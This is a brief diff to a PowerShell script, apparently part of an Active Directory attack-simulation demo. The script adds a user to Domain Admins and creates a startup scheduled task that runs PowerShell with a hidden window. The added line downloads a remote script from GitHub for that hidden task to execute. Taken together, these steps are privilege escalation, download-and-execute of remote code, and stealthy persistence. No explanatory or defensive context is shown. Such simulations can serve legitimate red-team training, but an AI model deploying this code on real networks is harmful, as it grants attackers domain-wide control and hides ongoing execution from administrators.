@@ -8,6 +8,7 @@ $domainAdminGroup = "Domain Admins"
 Add-ADGroupMember -Identity $domainAdminGroup -Members $userName
 
 $scriptPath = "C:\demo\follow.ps1"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/natashell666/DemoScripts/main/ADSimulAttack/follow.ps1" -OutFile $scriptPath
 
 $action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
 $trigger = New-ScheduledTaskTrigger -AtStartup
